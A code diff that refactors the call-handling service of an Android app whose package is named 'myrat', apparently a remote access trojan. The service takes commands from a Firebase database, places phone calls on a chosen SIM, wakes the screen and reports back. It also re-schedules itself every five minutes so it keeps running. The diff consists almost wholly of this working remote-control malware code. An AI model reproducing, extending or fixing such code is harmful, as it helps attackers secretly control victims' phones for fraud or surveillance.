@@ -1,18 +1,18 @@
 package com.myrat.app.service
 
 import android.Manifest
-import android.app.*
 import android.content.ActivityNotFoundException
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
-import android.os.*
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.telecom.PhoneAccountHandle
 import android.telecom.TelecomManager
 import android.telephony.SubscriptionManager
-import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.work.*
 import com.google.firebase.database.*
@@ -20,50 +20,31 @@ import com.google.firebase.database.ktx.database
 import com.google.firebase.ktx.Firebase
 import com.myrat.app.LauncherActivity
 import com.myrat.app.MainActivity
+import com.myrat.app.utils.Constants
 import com.myrat.app.utils.Logger
+import com.myrat.app.utils.PermissionUtils
 import com.myrat.app.worker.CallServiceRestartWorker
 import java.util.concurrent.TimeUnit
 
-class CallService : Service() {
-    companion object {
-        private const val CHANNEL_ID = "CallServiceChannel"
-        private const val NOTIFICATION_ID = 8
-    }
-
+class CallService : BaseService() {
+    
+    override val notificationId = 8
+    override val channelId = Constants.NOTIFICATION_CHANNEL_CALL
+    override val serviceName = "CallService"
 
     private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
     private lateinit var deviceId: String
-    private var wakeLock: PowerManager.WakeLock? = null
-
-    override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
         try {
-            acquireWakeLock()
             deviceId = MainActivity.getDeviceId(this)
-            createNotificationChannel()
-            val notification = buildForegroundNotification()
-            startForeground(NOTIFICATION_ID, notification)
-            scheduleRestart(this)
+            startForegroundService("Call Service", "Monitoring call commands with SIM selection")
+            scheduleRestart()
             Logger.log("CallService created successfully for device: $deviceId")
         } catch (e: Exception) {
             Logger.error("Failed to initialize CallService", e)
             stopSelf()
-        }
-    }
-
-    private fun acquireWakeLock() {
-        try {
-            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = powerManager.newWakeLock(
-                PowerManager.PARTIAL_WAKE_LOCK,
-                "CallService:KeepAlive"
-            )
-            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
-            Logger.log("Wake lock acquired for CallService")
-        } catch (e: Exception) {
-            Logger.error("Failed to acquire wake lock for calls", e)
         }
     }
 
@@ -74,22 +55,30 @@ class CallService : Service() {
                 stopSelf()
                 return START_NOT_STICKY
             }
+            
+            // Check permissions before starting
+            if (!PermissionUtils.hasAllCallPermissions(this)) {
+                Logger.error("Missing call permissions, stopping CallService")
+                stopSelf()
+                return START_NOT_STICKY
+            }
+            
             listenForCallCommands(deviceId)
-            return START_STICKY
+            return super.onStartCommand(intent, flags, startId)
         } catch (e: Exception) {
             Logger.error("Failed to start CallService", e)
             return START_NOT_STICKY
         }
     }
 
-    private fun scheduleRestart(context: Context) {
+    private fun scheduleRestart() {
         try {
             val workRequest = PeriodicWorkRequestBuilder<CallServiceRestartWorker>(
                 repeatInterval = 5, TimeUnit.MINUTES,
                 flexTimeInterval = 1, TimeUnit.MINUTES
             ).build()
 
-            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
+            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                 "CallServiceRestart",
                 ExistingPeriodicWorkPolicy.KEEP,
                 workRequest
@@ -97,49 +86,6 @@ class CallService : Service() {
             Logger.log("Scheduled CallService restart using WorkManager")
         } catch (e: Exception) {
             Logger.error("Failed to schedule CallService restart", e)
-        }
-    }
-
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            try {
-                val channel = NotificationChannel(
-                    CHANNEL_ID,
-                    "Call Service",
-                    NotificationManager.IMPORTANCE_LOW
-                ).apply {
-                    description = "Running phone call service with SIM selection"
-                    setShowBadge(false)
-                    enableLights(false)
-                    enableVibration(false)
-                    setSound(null, null)
-                }
-                val notificationManager = getSystemService(NotificationManager::class.java)
-                notificationManager.createNotificationChannel(channel)
-            } catch (e: Exception) {
-                Logger.error("Failed to create call notification channel", e)
-            }
-        }
-    }
-
-    private fun buildForegroundNotification(): Notification {
-        return try {
-            NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Call Service")
-                .setContentText("Monitoring call commands with SIM selection")
-                .setSmallIcon(android.R.drawable.ic_menu_call)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .setOngoing(true)
-                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
-                .build()
-        } catch (e: Exception) {
-            Logger.error("Failed to build call notification", e)
-            NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Call Service")
-                .setContentText("Running in background")
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .setOngoing(true)
-                .build()
         }
     }
 
@@ -213,16 +159,9 @@ class CallService : Service() {
                 return false
             }
 
-            // Check permissions
-            val hasCallPhonePermission = ContextCompat.checkSelfPermission(
-                this, Manifest.permission.CALL_PHONE
-            ) == PackageManager.PERMISSION_GRANTED
-            val hasReadPhoneStatePermission = ContextCompat.checkSelfPermission(
-                this, Manifest.permission.READ_PHONE_STATE
-            ) == PackageManager.PERMISSION_GRANTED
-
-            if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
-                Logger.error("Missing permissions: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
+            // Check permissions using centralized utility
+            if (!PermissionUtils.hasAllCallPermissions(this)) {
+                Logger.error("Missing call permissions")
                 updateCommandStatus(commandId, "failed", "Missing required permissions")
                 return false
             }
@@ -299,7 +238,7 @@ class CallService : Service() {
             wakeUpScreen()
 
             // Method 1: Try TelecomManager with enhanced SIM selection
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                 try {
                     val telecomManager = getSystemService(TELECOM_SERVICE) as TelecomManager
                     val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager, subId)
@@ -379,29 +318,41 @@ class CallService : Service() {
             val phoneAccounts = telecomManager.callCapablePhoneAccounts
             Logger.log("Available phone accounts: ${phoneAccounts.size}")
 
+            // Get SubscriptionManager to verify subscription exists
+            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+            val activeSubscriptions = subscriptionManager?.activeSubscriptionInfoList
+            Logger.log("Active subscriptions: ${activeSubscriptions?.size ?: 0}")
+
             phoneAccounts.find { account ->
                 try {
                     val phoneAccount = telecomManager.getPhoneAccount(account)
                     val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1) ?: -1
-                    Logger.log("Checking account: $account, subId: $accountSubId vs target: $subId")
-                    accountSubId == subId
+
+                    // Verify the subscriptionId exists in active subscriptions
+                    val isValidSubscription = activeSubscriptions?.any { it.subscriptionId == accountSubId } ?: false
+                    Logger.log("🔍 Comparing accountSubId: $accountSubId with target subId: $subId, isValid: $isValidSubscription")
+
+                    accountSubId == subId && isValidSubscription
                 } catch (e: Exception) {
                     Logger.error("Error checking phone account: $account", e)
                     false
                 }
             }
+        } catch (e: SecurityException) {
+            Logger.error("SecurityException while getting PhoneAccountHandle", e)
+            null
         } catch (e: Exception) {
-            Logger.error("Error getting PhoneAccountHandle for subId: $subId", e)
+            Logger.error("Failed to get PhoneAccountHandle for subId: $subId", e)
             null
         }
     }
 
     private fun wakeUpScreen() {
         try {
-            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
             if (!powerManager.isInteractive) {
                 val screenWakeLock = powerManager.newWakeLock(
-                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
+                    android.os.PowerManager.FULL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or android.os.PowerManager.ON_AFTER_RELEASE,
                     "CallService:ScreenWake"
                 )
                 screenWakeLock.acquire(10000) // 10 seconds
@@ -442,20 +393,6 @@ class CallService : Service() {
                 }
         } catch (e: Exception) {
             Logger.error("Error updating call command status", e)
-        }
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        try {
-            wakeLock?.let {
-                if (it.isHeld) {
-                    it.release()
-                }
-            }
-            Logger.log("CallService destroyed")
-        } catch (e: Exception) {
-            Logger.error("Error destroying CallService", e)
         }
     }
 }
